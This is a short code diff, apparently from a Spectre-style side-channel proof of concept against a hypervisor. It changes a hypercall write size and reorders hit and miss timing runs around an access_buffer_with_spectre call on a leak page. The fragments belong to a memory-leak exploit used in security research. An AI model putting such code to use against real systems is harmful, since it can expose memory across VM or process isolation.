@@ -24,7 +24,7 @@ int hypercall(struct send_ipi_hypercall *opts) {
     err(fd, "Failed to open %s", hypercall_path);
   }
 
-  int b = write(fd, opts, 2 * sizeof(*opts));
+  int b = write(fd, opts, sizeof(*opts));
   close(fd);
   if (b < 0) {
     err(errno, "Failed to write to %s", hypercall_path);
@@ -266,10 +266,10 @@ int main(int argc, char *argv[argc]) {
     }
 
     const size_t iterations = 10000;
-    printf("Running with min %lx\n", ~min);
-    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
     printf("Running with min %lx\n", min);
     size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
+    printf("Running with min %lx\n", ~min);
+    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
 
     printf("Miss: %ld\tHit: %ld\n", miss, hit);
   } else if (!strcmp(argv[1], "find_min")) {
